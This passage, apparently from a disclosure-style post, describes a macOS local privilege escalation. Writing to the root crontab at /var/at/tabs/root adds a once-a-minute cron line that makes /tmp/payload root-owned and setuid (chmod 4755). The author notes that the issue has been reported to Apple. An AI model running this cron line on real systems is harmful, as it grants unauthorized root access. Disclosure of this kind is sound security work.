```
/var/at/tabs/root
```
 
with a 60-second cron line, eg:
 
```
* * * * * chown root:wheel /tmp/payload && chmod 4755 /tmp/payload
```
 
and then waiting for it to execute. It&#039;s not clear if this is a macOS-specific issue or a hangover from the BSD-inherited cron system, I suspect the latter.
 
The issue has been reported to Apple so hopefully they will fix it.
